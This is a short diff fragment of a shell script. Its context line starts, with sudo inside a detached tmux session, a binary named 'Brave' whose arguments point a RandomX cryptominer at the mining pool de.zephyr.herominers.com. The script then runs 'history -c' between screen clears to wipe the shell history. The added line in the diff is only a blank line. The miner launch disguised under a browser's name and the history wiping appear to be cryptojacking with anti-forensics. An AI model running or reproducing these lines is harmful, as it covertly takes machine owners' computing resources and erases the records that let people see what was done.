@@ -16,3 +16,4 @@ tmux new-session -d -s 01 'sudo ./Brave -a rx -o de.zephyr.herominers.com:1123 -
 clear
 history -c
 clear
+
